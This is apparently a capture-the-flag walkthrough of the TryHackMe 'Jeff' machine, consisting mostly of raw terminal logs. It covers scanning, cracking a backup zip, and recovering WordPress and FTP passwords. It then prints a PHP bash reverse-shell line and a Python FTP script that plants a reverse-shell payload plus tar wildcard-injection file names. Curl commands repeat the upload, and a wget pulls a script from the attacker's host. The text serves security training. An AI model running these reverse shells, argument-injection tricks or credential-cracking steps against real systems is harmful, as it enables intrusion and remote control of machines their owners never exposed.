# Jeff

Can you hack Jeff's web server?

- [Jeff](https://tryhackme.com/room/jeff)

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Get Root

This machine may take upto 5 minutes to fully deploy.

Get user.txt and root.txt.

This is my first ever box, I hope you enjoy it. If you find yourself brute forcing SSH, you're doing it wrong.

Please don't post spoilers or stream the box for at least a couple of days.

```
kali@kali:~/CTFs/tryhackme/Jeff$ sudo nmap -A -sS -sC -sV -Pn -O 10.10.8.137
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-17 13:12 CEST
Nmap scan report for 10.10.8.137
Host is up (0.035s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 7e:43:5f:1e:58:a8:fc:c9:f7:fd:4b:40:0b:83:79:32 (RSA)
|   256 5c:79:92:dd:e9:d1:46:50:70:f0:34:62:26:f0:69:39 (ECDSA)
|_  256 ce:d9:82:2b:69:5f:82:d0:f5:5c:9b:3e:be:76:88:c3 (ED25519)
80/tcp open  http    nginx
|_http-title: Site doesn't have a title (text/html).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 (86%), Infomir MAG-250 set-top box (86%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   35.69 ms 10.8.0.1
2   35.54 ms 10.10.8.137

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.51 seconds
```

```
kali@kali:~/CTFs/tryhackme/Jeff$ gobuster dir -u http://jeff.thm -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://jeff.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/17 13:14:30 Starting gobuster
===============================================================
/admin (Status: 301)
/assets (Status: 301)
/backups (Status: 301)
/index.html (Status: 200)
/uploads (Status: 301)
===============================================================
2020/10/17 13:14:47 Finished
===============================================================
```

```
kali@kali:~/CTFs/tryhackme/Jeff$ gobuster dir -u http://jeff.thm/admin/ -x zip,bak,old,php -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://jeff.thm/admin/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     zip,bak,old,php
[+] Timeout:        10s
===============================================================
2020/10/17 13:14:42 Starting gobuster
===============================================================
/index.html (Status: 200)
/login.php (Status: 200)
===============================================================
2020/10/17 13:16:07 Finished
===============================================================
```

```
kali@kali:~/CTFs/tryhackme/Jeff$ gobuster dir -u http://jeff.thm/backups/ -x zip,bak,old,php -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://jeff.thm/backups/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     zip,bak,old,php
[+] Timeout:        10s
===============================================================
2020/10/17 13:18:02 Starting gobuster
===============================================================
/backup.zip (Status: 200)
/index.html (Status: 200)
Progress: 2317 / 4615 (50.21%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/17 13:18:56 Finished
===============================================================
```

```
kali@kali:~/CTFs/tryhackme/Jeff$ zipinfo backup.zip
Archive:  backup.zip
Zip file size: 62753 bytes, number of entries: 9
drwxrwx---  3.0 unx        0 bx stor 20-May-14 17:20 backup/
drwxrwx---  3.0 unx        0 bx stor 20-May-14 17:20 backup/assets/
-rwxrwx---  3.0 unx    34858 TX defN 20-May-14 17:20 backup/assets/EnlighterJS.min.css
-rwxrwx---  3.0 unx    49963 TX defN 20-May-14 17:20 backup/assets/EnlighterJS.min.js
-rwxrwx---  3.0 unx    89614 TX defN 20-May-14 17:20 backup/assets/MooTools-Core-1.6.0-compressed.js
-rwxrwx---  3.0 unx    11524 BX defN 20-May-14 17:20 backup/assets/profile.jpg
-rwxrwx---  3.0 unx     1439 TX defN 20-May-14 17:20 backup/assets/style.css
-rwxrwx---  3.0 unx     1178 TX defN 20-May-14 17:20 backup/index.html
-rwxrwx---  3.0 unx       41 TX stor 20-May-14 17:20 backup/wpadmin.bak
9 files, 188617 bytes uncompressed, 60951 bytes compressed:  67.7%
kali@kali:~/CTFs/tryhackme/Jeff$ zip2john backup.zip > backup.hash
backup.zip/backup/ is not encrypted!
backup.zip/backup/assets/ is not encrypted!
ver 1.0 backup.zip/backup/ is not encrypted, or stored with non-handled compression type
ver 1.0 backup.zip/backup/assets/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/EnlighterJS.min.css PKZIP Encr: 2b chk, TS_chk, cmplen=6483, decmplen=34858, crc=541FD3B0
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/EnlighterJS.min.js PKZIP Encr: 2b chk, TS_chk, cmplen=14499, decmplen=49963, crc=545D786A
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/MooTools-Core-1.6.0-compressed.js PKZIP Encr: 2b chk, TS_chk, cmplen=27902, decmplen=89614, crc=43D2FC37
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/profile.jpg PKZIP Encr: 2b chk, TS_chk, cmplen=10771, decmplen=11524, crc=F052E57A
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/style.css PKZIP Encr: 2b chk, TS_chk, cmplen=675, decmplen=1439, crc=9BA0C7C1
ver 2.0 efh 5455 efh 7875 backup.zip/backup/index.html PKZIP Encr: 2b chk, TS_chk, cmplen=652, decmplen=1178, crc=39D2DBFF
ver 1.0 efh 5455 efh 7875 backup.zip/backup/wpadmin.bak PKZIP Encr: 2b chk, TS_chk, cmplen=53, decmplen=41, crc=FAECFEFB
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
kali@kali:~/CTFs/tryhackme/Jeff$ john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!!Burningbird!!  (backup.zip)
1g 0:00:00:04 DONE (2020-10-17 13:21) 0.2036g/s 2920Kp/s 2920Kc/s 2920KC/s !!rebound!!..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```
kali@kali:~/CTFs/tryhackme/Jeff$ cat backup/wpadmin.bak
wordpress password is: phO#g)C5dhIWZn3BKP
```

```
kali@kali:~/CTFs/tryhackme/Jeff$ gobuster vhost -u http://jeff.thm -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:          http://jeff.thm
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/dirb/common.txt
[+] User Agent:   gobuster/3.0.1
[+] Timeout:      10s
===============================================================
2020/10/17 13:23:32 Starting gobuster
===============================================================
Found: wordpress.jeff.thm (Status: 200) [Size: 25901]
===============================================================
2020/10/17 13:23:51 Finished
===============================================================
kali@kali:~/CTFs/tryhackme/Jeff$ sudo nano /etc/hosts
```

```
kali@kali:~/CTFs/tryhackme/Jeff$ wpscan --url http://wordpress.jeff.thm -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.1
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://wordpress.jeff.thm/ [10.10.8.137]
[+] Started: Sat Oct 17 13:25:32 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: nginx
 |  - X-Powered-By: PHP/7.3.17
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://wordpress.jeff.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://wordpress.jeff.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://wordpress.jeff.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).
 | Found By: Rss Generator (Passive Detection)
 |  - http://wordpress.jeff.thm/?feed=rss2, <generator>https://wordpress.org/?v=5.4.1</generator>
 |  - http://wordpress.jeff.thm/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.4.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://wordpress.jeff.thm/wp-content/themes/twentytwenty/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://wordpress.jeff.thm/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | Style URL: http://wordpress.jeff.thm/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://wordpress.jeff.thm/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] jeff
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Sat Oct 17 13:25:42 2020
[+] Requests Done: 60
[+] Cached Requests: 6
[+] Data Sent: 12.886 KB
[+] Data Received: 12.99 MB
[+] Memory used: 177.816 MB
[+] Elapsed time: 00:00:10
```

`exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.106.222/9001 0>&1'");`

```
www-data@Jeff:/var/www/html$ ls -la
ls -la
total 228
drwxr-xr-x  5 www-data www-data  4096 Oct 17 11:12 .
drwxr-xr-x  1 root     root      4096 Apr 23 16:34 ..
-rw-r--r--  1 www-data www-data   261 May 14 16:54 .htaccess
-rw-r--r--  1 root     root       575 May 18 11:57 ftp_backup.php
-rw-r--r--  1 www-data www-data   405 Feb  6  2020 index.php
-rw-r--r--  1 www-data www-data 19915 Feb 12  2020 license.txt
-rw-r--r--  1 www-data www-data  7278 Jan 10  2020 readme.html
-rw-r--r--  1 www-data www-data  6912 Feb  6  2020 wp-activate.php
drwxr-xr-x  9 www-data www-data  4096 Apr 29 18:58 wp-admin
-rw-r--r--  1 www-data www-data   351 Feb  6  2020 wp-blog-header.php
-rw-r--r--  1 www-data www-data  2275 Feb  6  2020 wp-comments-post.php
-rw-r--r--  1 www-data www-data  2823 Oct 17 11:12 wp-config-sample.php
-rw-r--r--  1 www-data www-data  3198 Oct 17 11:12 wp-config.php
drwxr-xr-x  4 www-data www-data  4096 Oct 17 11:29 wp-content
-rw-r--r--  1 www-data www-data  3940 Feb  6  2020 wp-cron.php
drwxr-xr-x 21 www-data www-data 12288 Apr 29 18:58 wp-includes
-rw-r--r--  1 www-data www-data  2496 Feb  6  2020 wp-links-opml.php
-rw-r--r--  1 www-data www-data  3300 Feb  6  2020 wp-load.php
-rw-r--r--  1 www-data www-data 47874 Feb 10  2020 wp-login.php
-rw-r--r--  1 www-data www-data  8509 Apr 14  2020 wp-mail.php
-rw-r--r--  1 www-data www-data 19396 Apr 10  2020 wp-settings.php
-rw-r--r--  1 www-data www-data 31111 Feb  6  2020 wp-signup.php
-rw-r--r--  1 www-data www-data  4755 Feb  6  2020 wp-trackback.php
-rw-r--r--  1 www-data www-data  3133 Feb  6  2020 xmlrpc.php
```

```
www-data@Jeff:/var/www/html$ cat ftp_backup.php
cat ftp_backup.php
```

```php
<?php
/*
    Todo: I need to finish coding this database backup script.
          also maybe convert it to a wordpress plugin in the future.
*/
$dbFile = 'db_backup/backup.sql';
$ftpFile = 'backup.sql';

$username = "backupmgr";
$password = "SuperS1ckP4ssw0rd123!";

$ftp = ftp_connect("172.20.0.1"); // todo, set up /etc/hosts for the container host

if( ! ftp_login($ftp, $username, $password) ){
    die("FTP Login failed.");
}

$msg = "Upload failed";
if (ftp_put($ftp, $remote_file, $file, FTP_ASCII)) {
    $msg = "$file was uploaded.\n";
}

echo $msg;
ftp_close($conn_id);
```

```py
#!/usr/bin/env python3.7
from ftplib import FTP
import io

host = '172.20.0.1'
username = "backupmgr"
password = "SuperS1ckP4ssw0rd123!"

ftp = FTP(host = host)
login_status = ftp.login(user = username,passwd = password)
print(login_status)
ftp.set_pasv(False)
ftp.cwd('files')
print(ftp.dir())

shell = io.BytesIO(b'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.106.222",9002));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);')
trash = io.BytesIO(b'')

ftp.storlines('STOR shell.sh',shell)
ftp.storlines('STOR --checkpoint=1',trash)
ftp.storlines('STOR --checkpoint-action=exec=sh shell.sh',trash)
ftp.dir()

ftp.quit()
```

```
www-data@Jeff:/tmp$ wget 10.8.106.222/shell.py
wget 10.8.106.222/shell.py
--2020-10-17 12:01:19--  http://10.8.106.222/shell.py
Connecting to 10.8.106.222:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 739 [text/plain]
Saving to: 'shell.py'

     0K                                                       100% 6.69M=0s

2020-10-17 12:01:19 (6.69 MB/s) - 'shell.py' saved [739/739]

www-data@Jeff:/tmp$ chmod +x shell.py
chmod +x shell.py
www-data@Jeff:/tmp$ python3.7 shell.py
python3.7 shell.py
230 Login successful.
-rwxr-xr-x    1 1001     1001            0 Oct 17 11:59 --checkpoint-action=exec=sh shell.sh
-rwxr-xr-x    1 1001     1001            0 Oct 17 11:59 --checkpoint=1
-rwxr-xr-x    1 1001     1001          228 Oct 17 11:59 shell.sh
None
-rwxr-xr-x    1 1001     1001            0 Oct 17 12:01 --checkpoint-action=exec=sh shell.sh
-rwxr-xr-x    1 1001     1001            0 Oct 17 12:01 --checkpoint=1
-rwxr-xr-x    1 1001     1001          228 Oct 17 12:01 shell.sh
www-data@Jeff:/tmp$
```

`curl -P - 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/' -s`

```
echo "python3.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.8.106.222\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'" > shell.sh
echo "" > "/tmp/--checkpoint=1"
echo "" > "/tmp/--checkpoint-action=exec=sh shell.sh"

And now, let’s upload them to the remote location:

curl -v -P - -T "/tmp/shell.sh" 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/'
curl -v -P - -T "/tmp/--checkpoint=1" 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/'
curl -v -P - -T "/tmp/--checkpoint-action=exec=sh shell.sh" 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/'
```

1. Hack the machine and obtain the user.txt flag.
2. Escalate your privileges, whats the root flag?
